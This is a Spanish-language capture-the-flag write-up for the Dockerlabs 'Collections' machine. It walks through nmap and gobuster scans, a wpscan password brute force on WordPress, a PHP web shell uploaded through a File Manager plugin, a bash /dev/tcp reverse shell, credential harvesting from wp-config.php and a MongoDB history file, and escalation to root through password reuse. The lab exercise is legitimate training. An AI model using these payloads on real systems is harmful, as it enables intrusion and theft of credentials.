
# Writeup Template: Maquina `[ Collections ]`

- Tags: #Collections #MongoDB
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Collections](https://mega.nz/file/VGsyDaDB#nn63q8MTTYVUQ_47maZuKHD8LGigmSz27w1lp-loQDs)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x collections.zip
sudo bash auto_deploy.sh collections.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,27017 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52 ((UbuntuJammy))
27017/tcp open  mongodb MongoDB 7.0.9 6.1 or later
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/wordpress/: Blog
/wordpress/wp-login.php: Wordpress login page.
```

Revisando el codigo fuente vemos un dominio al que tenemos que apunar: para esto lo agregamos a nuestro archivos: **( /etc/hosts )**
```bash
http://collections.dl/
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://collections.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/wordpress/           (Status: 200) [Size: 96819]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://collections.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt
```

- **Hallazgos**:
```bash
/wordpress            (Status: 301) [Size: 320] [--> http://collections.dl/wordpress/]
```

#### Enumeracion Wordpress con `wpscan`
```bash
wpscan --url http://collections.dl/wordpress/ --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Reporte:
```bash
http://collections.dl/wordpress/xmlrpc.php
http://collections.dl/wordpress/readme.html
http://collections.dl/wordpress/wp-content/uploads/
http://collections.dl/wordpress/wp-cron.php
```
### Credenciales Encontradas
- Usuario: `[ [+] chocolate ]`

Ahora realizamos un ataque de fuerza bruta sobre este usuario:
```bash
wpscan --url http://collections.dl/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames chocolate
```

```bash
[!] Valid Combinations Found:
 | Username: chocolate, Password: chocolate
```

Tenemos credenciales validas para logueranos:
```bash
http://collections.dl/wordpress/wp-login.php
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Una ves logueados tenemos esta ruta donde podemos usbir archivos maliciosos:
```bash
http://collections.dl/wordpress/wp-content/uploads/
```

Descargargaremos un pluggin de wordpress: **( File Manager )** para que nos permita cargar un archivo malcioso:
Una ves descargado creamos un archivo malicioso php que nos permita ejecutar un comando a nivel de sistema **( cmd.php )**:
```php
<?php
  system($_GET["cmd"]);
?>
```

Ahora lo subieremos, Desde el **FileManager** buscamos el icono que nos permite subir archivos:
Una ves cargado en la carpteta **uploads** revisamos recargando la web en esta ruta para que muestre nuestro archivo:
```bash
http://collections.dl/wordpress/wp-content/uploads/
```
### Ejecucion del Ataque
```bash
# Comandos para explotación
http://collections.dl/wordpress/wp-content/uploads/cmd.php?cmd=whoami
```

### Intrusion
Ahora que tenemos ejecucion remota de comandos en el target procedemos a ganar acceso al servidor
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/IP_TARGE/PORT <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Uan ves dentro tenemos la configuracion de la base de datos: **( wp-config.php )**

**Hallazgos Clave:**
```bash
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpressuser' );

/** Database password */
define( 'DB_PASSWORD', 't9sH76gpQ82UFeZ3GXZS' );

/** Acceso alternativo chocolate:estrella */
```

Para el acceso alternativo usaremos esa contrasena para ver si podemos loguearnos como el usuario **chocolate**
```bash
su chocolate # ( estrella )
```

### Explotacion de Privilegios

###### Usuario `[ chocolate ]`:
Revisando esta ruta:
```bash
/home/chocolate/.mongodb/mongosh
```

Revisando el siguiente archivo tenemos credenciales:
```bash
cat mongosh_repl_history

db.fsyncLock()
db.usuarios.insert({"usuario": "dbadmin", "contraseña": "chocolaterequetebueno123"})
```

Tenemos la contrasena del usuario **dbadmin** asi que intentaremos loguearnos:
```bash
# Comando para escalar al usuario: ( dbadmin )
su dbadmin
```

###### Usuario `[ chocolate ]`:
Ahoro que ganamos aceso como este usuario toca ganar acceso como **root**
Listando los permisos del directorio: **( /tmp )** tenemeos un archivo **SUID** que pertenece a **root**
```bash
ps -faux
```

Vemos que este corriendo un proceso como **root** de **mongodb**:
```bash
/bin/sh -c service ssh start &&     service mariadb start &&     service apache2 start ; sleep 5 &&     mongod --bind_ip_all --quiet 
```

Esto indica que esta en escucha por todas las interfaces de red:
```bash
mongod --bind_ip_all --quiet
```

###### Exponer MongoDB en **todas las interfaces de red** (`--bind_ip_all`) representa un **grave riesgo de seguridad** por estas razones:
**Acceso no autenticado desde cualquier lugar**  
Por defecto, MongoDB **no requiere contraseña** si no se configura explícitamente. Cualquier atacante en tu red (o internet si no hay firewall) podría conectarse sin credenciales
```bash
mongo --host [IP] --port 27017  # ¡Acceso total!
```

Sabiendo esto desde nuestra maquina atacante nos conectaremos a **mongodb**
```bash
mongo --host 172.17.0.2 --port 27017
```

Vemos que dumpeando la informacion es la misma que previamente habiamos encontrado revisando los archivos de **mongoDB**
```bash
> db.usuarios.find().pretty();
{
        "_id" : ObjectId("6645f4456682cdae1b46b799"),
        "nombre" : "dbadmin",
        "contraseña" : "chocolaterequetebueno123"
}
```

Despues de enumerar el sistema y no encontrar nada critico probamos esa contrasena para el usuaior **root**:
```bash
su root # ( chocolaterequetebueno123 )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@f5a67490b08a:/home/dbadmin# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enumerar de manera agressiva un **CMSWordpress**
2. Aprendimos a subir un archivo maliciosos en el **CMSWordpress**
3. Aprendimos a **dumpear** una base de datos **noSQL** como **MongoDB**

## Recomendaciones de Seguridad
- Usar contrasenas mas robustas para los usuarios del **CMSWordpress**